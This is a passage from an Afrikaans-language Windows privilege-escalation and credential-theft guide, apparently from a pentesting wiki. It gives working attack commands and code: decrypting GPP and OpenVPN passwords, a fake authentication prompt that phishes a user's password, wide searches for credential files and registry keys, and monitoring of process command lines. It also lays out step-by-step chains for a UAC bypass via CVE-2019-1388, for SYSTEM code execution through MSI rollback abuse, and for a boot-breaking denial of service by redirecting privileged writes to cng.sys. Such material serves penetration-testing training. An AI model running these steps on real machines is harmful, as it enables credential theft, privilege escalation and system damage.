- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-geloofsbriewe
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir geloofsbriewe

Jy kan altyd **die gebruiker vra om sy geloofsbriewe in te voer of selfs die geloofsbriewe van ’n ander gebruiker** as jy dink hy kan hulle ken (let op dat **om** die kliënt direk vir die **geloofsbriewe** te **vra** regtig **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat geloofsbriewe bevat**

Bekende lêers wat ’n ruk gelede **wagwoorde** in **duidelike teks** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek deur al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredensiële in die RecycleBin

Jy behoort ook die Bin na te gaan om vir kredensiële daarin te soek

Om **wagwoorde te herwin** wat deur verskeie programme gestoor is kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike register-sleutels met kredensiële**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Onttrek openssh keys uit die register.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Jy moet kyk vir dbs waar wagwoorde van **Chrome or Firefox** gestoor is.\
Kyk ook na die history, bookmarks en favourites van die browsers sodat daar dalk **passwords are** gestoor is.

Tools om wagwoorde uit browsers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie wat binne die Windows-bedryfstelsel gebou is en wat **intercommunication** tussen sagteware-komponente van verskillende tale toelaat. Elke COM-komponent word **geïdentifiseer via 'n class ID (CLSID)** en elke komponent stel funksionaliteit bloot via een of meer interfaces, geïdentifiseer via interface IDs (IIDs).

COM classes en interfaces word in die register gedefinieer onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** onderskeidelik. Hierdie register word geskep deur die samesmelting van die **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Binne die CLSIDs van hierdie register kan jy die child registry **InProcServer32** vind wat 'n **default value** bevat wat na 'n **DLL** wys en 'n value genaamd **ThreadingModel** wat **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) of **Neutral** (Thread Neutral) kan wees.

![](<../../images/image (729).png>)

Basies, as jy enige van die **DLLs** kan **overwrite** wat uitgevoer gaan word, kan jy **privileges escalate** as daardie DLL deur 'n ander user uitgevoer gaan word.

Om te leer hoe attackers COM Hijacking as 'n persistence mechanism gebruik, kyk:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek vir 'n lêer met 'n sekere lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin wat ek geskep het om **outomaties elke metasploit POST module uit te voer wat vir credentials soek** binne die slagoffer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende tool om wagwoorde uit 'n stelsel te onttrek.

Die tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in gewone teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) **met volle toegang**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae voorregte maar erf al die open handles van die hoofproses**.\
Dan, as jy **volle toegang tot die lae voorregproses** het, kan jy die **open handle na die bevoorregte proses wat geskep is** met `OpenProcess()` gryp en **'n shellcode inspuit**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander post vir 'n meer volledige verduideliking oor hoe om meer open handlers van prosesse en threads te toets en te misbruik wat geërf is met verskillende vlakke van toestemmings (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheue-segmente, bekend as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Named Pipes**, wat nie-verwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos 'n kliënt/bediener-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur 'n pipe deur 'n **client** gestuur word, het die **server** wat die pipe opgestel het die vermoë om die **identiteit aan te neem** van die **client**, mits dit die nodige **SeImpersonate**-regte het. Om 'n **bevoorregte proses** te identifiseer wat via 'n pipe kommunikeer wat jy kan namaak, bied 'n geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het, interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, kan nuttige gidse [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system) gevind word.

Ook laat die volgende instrument toe om **'n named pipe-kommunikasie te onderskep met 'n instrument soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie instrument laat jou toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) in bedienermodus stel `\\pipe\\tapsrv` (MS-TRP) bloot. 'n Veraf geverifieerde client kan die mailslot-gebaseerde async event-pad misbruik om `ClientAttach` in 'n arbitrêre **4-byte write** na enige bestaande lêer wat deur `NETWORK SERVICE` skryfbaar is, te verander, en dan Telephony admin regte verkry en 'n arbitrêre DLL as die diens laai. Volledige vloei:

- `ClientAttach` met `pszDomainUser` gestel na 'n skryfbare bestaande pad → die diens open dit via `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir async event writes.
- Elke event skryf die aanvaller-beheerde `InitContext` van `Initialize` na daardie handle. Registreer 'n line app met `LRegisterRequestRecipient` (`Req_Func 61`), aktiveer `TRequestMakeCall` (`Req_Func 121`), haal dit via `GetAsyncEvents` (`Req_Func 0`) op, en deregistreer/skakel af om deterministiese writes te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` by, koppel weer, en roep dan `GetUIDllName` met 'n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` deurgegee word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde scheme) aktiveer en aanvaller-beheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word en wat **geloofsbriewe op die command line deurgee**. Die script hieronder vang proses command lines elke twee sekondes vas en vergelyk die huidige toestand met die vorige toestand, en voer enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Steling wagwoorde van prosesse

## Van Lae Priv Gebruiker na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC is geaktiveer, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf ’n onregmatige gebruiker te laat loop.

Dit maak dit moontlik om privileges te verhoog en UAC terselfdertyd te omseil met dieselfde vulnerability. Daarbenewens is daar geen behoefte om enigiets te installeer nie en die binary wat tydens die proses gebruik word, is onderteken en uitgereik deur Microsoft.

Sommige van die geraakte systems is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Van Administrator Medium na High Integrity Level / UAC Bypass

Lees hierdie om **oor Integrity Levels te leer**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan **hierdie om oor UAC en UAC bypasses te leer:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Arbitrary Folder Delete/Move/Rename na SYSTEM EoP

Die tegniek wat in [**hierdie blog pos**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beskryf word, met ’n exploit code [**beskikbaar hier**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies daaruit om die Windows Installer se rollback feature te misbruik om legitieme files tydens die uninstall-proses met malicious ones te vervang. Hiervoor moet die attacker ’n **malicious MSI installer** skep wat gebruik sal word om die `C:\Config.Msi` folder te hijack, wat later deur die Windows Installer gebruik sal word om rollback files te stoor tydens die uninstall van ander MSI packages, waar die rollback files gewysig sou wees om die malicious payload te bevat.

Die opgesomde tegniek is die volgende:

1. **Stage 1 – Voorbereiding vir die Hijack (laat `C:\Config.Msi` leeg)**

- Stap 1: Installeer die MSI
- Skep ’n `.msi` wat ’n onskadelike file installeer (bv. `dummy.txt`) in ’n writable folder (`TARGETDIR`).
- Merk die installer as **"UAC Compliant"**, sodat ’n **non-admin user** dit kan run.
- Hou ’n **handle** oop na die file ná install.

- Stap 2: Begin Uninstall
- Uninstall dieselfde `.msi`.
- Die uninstall-proses begin files na `C:\Config.Msi` skuif en hulle na `.rbf` files hernoem (rollback backups).
- **Poll die oop file handle** met `GetFinalPathNameByHandle` om te detect wanneer die file `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Custom Syncing
- Die `.msi` sluit ’n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- Signaleer wanneer `.rbf` geskryf is.
- Dan **wag** op ’n ander event voordat die uninstall voortgaan.

- Stap 4: Blokkeer Delete van `.rbf`
- Wanneer dit gesignaleer word, **open die `.rbf` file** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit deleted kan word**.
- Signaleer dan terug sodat die uninstall kan klaarmaak.
- Windows Installer slaag nie daarin om die `.rbf` te delete nie, en omdat dit nie al die contents kan delete nie, word **`C:\Config.Msi` nie verwyder nie**.

- Stap 5: Delete `.rbf` handmatig
- Jy (attacker) delete die `.rbf` file handmatig.
- Nou is **`C:\Config.Msi` leeg**, gereed om gehijack te word.

> Op hierdie punt, **trigger die SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te delete.

2. **Stage 2 – Vervang Rollback Scripts met Malicious Ones**

- Stap 6: Herkry `C:\Config.Msi` met Weak ACLs
- Recreate die `C:\Config.Msi` folder self.
- Stel **weak DACLs** in (bv. Everyone:F), en **hou ’n handle oop** met `WRITE_DAC`.

- Stap 7: Run Nog ’n Install
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Writable location.
- `ERROROUT`: ’n Variable wat ’n forced failure trigger.
- Hierdie install sal gebruik word om **rollback** weer te trigger, wat `.rbs` en `.rbf` lees.

- Stap 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
- Capture sy filename.

- Stap 9: Sync voor Rollback
- Die `.msi` bevat ’n **custom install action (`SyncBeforeRollback`)** wat:
- Signaleer ’n event wanneer die `.rbs` geskep is.
- Wag dan **voor** dit verder gaan.

- Stap 10: Herpas Weak ACL
- Ná ontvangs van die `.rbs created` event:
- Die Windows Installer **herpas strong ACLs** op `C:\Config.Msi`.
- Maar aangesien jy nog steeds ’n handle met `WRITE_DAC` het, kan jy **weer weak ACLs herpas**.

> ACLs word **slegs by handle open enforced**, so jy kan steeds na die folder skryf.

- Stap 11: Laat vals `.rbs` en `.rbf` val
- Oorskryf die `.rbs` file met ’n **vals rollback script** wat vir Windows sê om:
- Jou `.rbf` file (malicious DLL) te restore na ’n **privileged location** (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Laat jou vals `.rbf` val wat ’n **malicious SYSTEM-level payload DLL** bevat.

- Stap 12: Trigger die Rollback
- Signaleer die sync event sodat die installer hervat.
- ’n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die install **intensioneel te laat fail** op ’n bekende punt.
- Dit veroorsaak dat **rollback begin**.

- Stap 13: SYSTEM Installeer Jou DLL
- Windows Installer:
- Lees jou malicious `.rbs`.
- Kopieer jou `.rbf` DLL na die target location.
- Jy het nou jou **malicious DLL in ’n SYSTEM-loaded path**.

- Finale Stap: Execute SYSTEM Code
- Run ’n trusted **auto-elevated binary** (bv. `osk.exe`) wat die DLL load wat jy gehijack het.
- **Boom**: Jou code word uitgevoer **as SYSTEM**.


### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof MSI rollback-tegniek (die vorige een) veronderstel dat jy ’n **hele folder** kan delete (bv. `C:\Config.Msi`). Maar wat as jou vulnerability slegs **arbitrary file deletion** toelaat?

Jy kan **NTFS internals** misbruik: elke folder het ’n hidden alternate data stream genoem:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeks-metadata** van die gids.

Dus, as jy die `::$INDEX_ALLOCATION`-stroom van 'n gids **verwyder**, **verwyder NTFS die hele gids** uit die lêerstelsel.

Jy kan dit doen met standaard lêer-verwyderings-API's soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Selfs al roep jy 'n *lêer* delete API aan, **delete dit die folder self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders te delete nie, maar dit **laat wel deletion van die *contents* van 'n attacker-controlled folder toe**?

1. Step 1: Setup 'n bait folder en file
- Create: `C:\temp\folder1`
- Binne dit: `C:\temp\folder1\file1.txt`

2. Step 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pause execution** wanneer 'n privileged process probeer om `file1.txt` te delete.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Trigger SYSTEM-proses (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om hul inhoud uit te vee.
- Wanneer dit by `file1.txt` uitkom, **trigger die oplock** en gee beheer oor aan jou callback.

4. Stap 4: Binne die oplock-callback – herlei die uitwissing

- Opsie A: Skuif `file1.txt` elders
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moenie `file1.txt` direk uitvee nie — dit sal die oplock voortydig vrystel.

- Opsie B: Verander `folder1` in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die NTFS interne stroom wat gidsmetadata stoor — as jy dit uitvee, vee dit die gids uit.

5. Stap 5: Stel die oplock vry
- SYSTEM-proses gaan voort en probeer om `file1.txt` uit te vee.
- Maar nou, as gevolg van die junction + symlink, vee dit eintlik uit:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` word deur SYSTEM verwyder.

### From Arbitrary Folder Create to Permanent DoS

Ontgin 'n primitive wat jou toelaat om **'n arbitrêre gids as SYSTEM/admin te skep** — selfs al **kan jy nie lêers skryf nie** of **swak toestemmings stel nie**.

Skep 'n **gids** (nie 'n lêer nie) met die naam van 'n **kritieke Windows drywer**, bv.:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad stem normaalweg ooreen met die `cng.sys` kernel-mode driver.
- As jy dit **vooraf as ’n folder skep**, slaag Windows nie daarin om die werklike driver tydens boot te laai nie.
- Dan probeer Windows om `cng.sys` tydens boot te laai.
- Dit sien die folder, **misluk om die werklike driver op te los**, en **crash of stop die boot**.
- Daar is **geen fallback** nie, en **geen recovery** sonder eksterne ingryping nie (bv. boot repair of disk access).

### Van privileged log/backup paths + OM symlinks na arbitrary file overwrite / boot DoS

Wanneer ’n **privileged service** logs/exports na ’n pad skryf wat uit ’n **writable config** gelees word, herlei daardie pad met **Object Manager symlinks + NTFS mount points** om die privileged write in ’n arbitrary overwrite te verander (selfs **sonder** SeCreateSymbolicLinkPrivilege).

**Vereistes**
- Config wat die target path stoor, is deur die attacker skryfbaar (bv. `%ProgramData%\...\.ini`).
- Vermoë om ’n mount point na `\RPC Control` en ’n OM file symlink te skep (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- ’n Privileged operation wat na daardie pad skryf (log, export, report).

**Example chain**
1. Lees die config om die privileged log destination te herstel, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Herlei die pad sonder admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag vir die geprivilegieerde komponent om die log te skryf (bv. admin aktiveer "send test SMS"). Die skryfoperasie beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oorskryfde teiken (hex/PE parser) om korrupsie te bevestig; herlaai forseer Windows om die gepeuterde drywerpad te laai → **boot loop DoS**. Dit veralgemeen ook na enige beskermde lêer wat ’n geprivilegieerde diens vir skryf sal oopmaak.

> `cng.sys` word normaalweg vanaf `C:\Windows\System32\drivers\cng.sys` gelaai, maar as ’n kopie in `C:\Windows\System32\cng.sys` bestaan kan dit eerste probeer word, wat dit ’n betroubare DoS-sink vir korrupte data maak.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig uitvoer, want dit sal binne 20s gekill word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Van 'n High Integrity proses af kon jy probeer om die **AlwaysInstallElevated registry entries** te **enable** en 'n reverse shell te **install** met 'n _**.msi**_ wrapper.\
[Meer inligting oor die registry keys betrokke en hoe om 'n _.msi_ package hier te installeer.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die code hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik sal jy dit in 'n reeds High Integrity proses vind), sal jy in staat wees om **byna enige process oop te maak** (nie protected processes nie) met die SeDebug privilege, die **token van die process te kopieer**, en 'n **arbitrary process met daardie token te skep**.\
Hierdie technique word gewoonlik gebruik om **enige process te kies wat as SYSTEM met al die token privileges loop** (_ja, jy kan SYSTEM processes sonder al die token privileges vind_).\
**Jy kan 'n** [**example of code wat die voorgestelde technique uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie technique word deur meterpreter gebruik om te eskaleer in `getsystem`. Die technique bestaan daarin om **'n pipe te skep en dan 'n service te skep/misbruik om daarop te skryf**. Dan sal die **server** wat die pipe geskep het met die **`SeImpersonate`** privilege in staat wees om die **token te impersonate** van die pipe client (die service), en SYSTEM privileges te verkry.\
As jy meer oor name pipes wil [**leer, moet jy dit lees**](#named-pipe-client-impersonation).\
As jy 'n example wil lees van [**hoe om van high integrity na System te gaan met name pipes, moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll te **hijack** wat deur 'n **process** wat as **SYSTEM** loop, **gelaai** word, sal jy arbitrêre code met daardie permissions kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en boonop is dit baie **makliker om van 'n high integrity proses af te bereik**, aangesien dit **write permissions** sal hê op die folders wat gebruik word om dlls te laai.\
**Jy kan** [**meer leer oor Dll hijacking hier**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste tool om na Windows local privilege escalation vectors te kyk:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kyk vir misconfigurations en sensitive files (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kyk vir sommige moontlike misconfigurations en versamel info (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kyk vir misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP saved session information. Gebruik -Thorough plaaslik.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek crendentials uit Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
